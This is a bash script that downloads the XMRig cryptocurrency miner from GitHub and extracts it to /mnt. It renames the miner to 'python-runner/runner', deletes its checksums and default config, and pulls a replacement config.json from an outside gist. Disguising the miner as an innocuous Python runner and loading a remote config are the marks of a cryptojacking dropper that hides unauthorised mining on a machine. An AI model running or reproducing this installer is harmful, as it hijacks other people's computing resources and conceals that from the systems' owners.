#!/bin/bash
cd /tmp
wget -O python-runner.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
tar xvzf python-runner.tar.gz -C /mnt
rm -rf /tmp/python-runner.tar.gz
mv /mnt/xmrig-6.10.0 /mnt/python-runner
cd /mnt/python-runner
rm -rf /mnt/python-runner/SHA256SUMS && rm -rf /mnt/python-runner/config.json
mv /mnt/python-runner/xmrig /mnt/python-runner/runner
wget -O /mnt/python-runner/config.json https://gist.githubusercontent.com/Eilya/08599d39124e02252dbec21534607de0/raw/bb47bd10a7af07c1da2d88c6e6f3e3dcf7e5670d/config.json
